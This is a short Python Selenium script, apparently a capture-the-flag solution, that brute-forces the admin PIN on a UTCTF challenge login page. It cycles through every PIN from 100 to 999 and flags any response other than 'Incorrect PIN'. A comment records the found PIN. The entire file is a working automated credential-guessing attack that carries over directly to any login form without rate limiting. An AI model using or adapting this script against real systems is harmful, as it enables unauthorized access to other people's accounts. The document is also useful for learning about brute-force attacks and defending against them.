from selenium.webdriver.common.keys import Keys
from selenium import *
from pprint import pprint
from tqdm import tqdm

driver=webdriver.Chrome('/home/pwned/Downloads/chromedriver')
driver.maximize_window()
driver.get('http://web1.utctf.live:8651/internal/login')

for i in tqdm(range(100,999 + 1)): # the pin was from 100 to 999 [  PIN : 907  ]

    try:
        driver.find_element_by_xpath('/html/body/div[1]/div/form/input[1]').clear()
        driver.find_element_by_xpath('/html/body/div[1]/div/form/input[1]').send_keys("admin")
        driver.find_element_by_xpath('/html/body/div[1]/div/form/input[2]').clear()
        driver.find_element_by_xpath('/html/body/div[1]/div/form/input[2]').send_keys(str(i))

        driver.find_element_by_xpath('/html/body/div[1]/div/form/input[3]').click()
        m=driver.find_element_by_xpath('/html/body/div[1]/div/span')

        if m.text!='Incorrect PIN':
            print(m.text)
            print(m)
            print(i)
    except:
        break
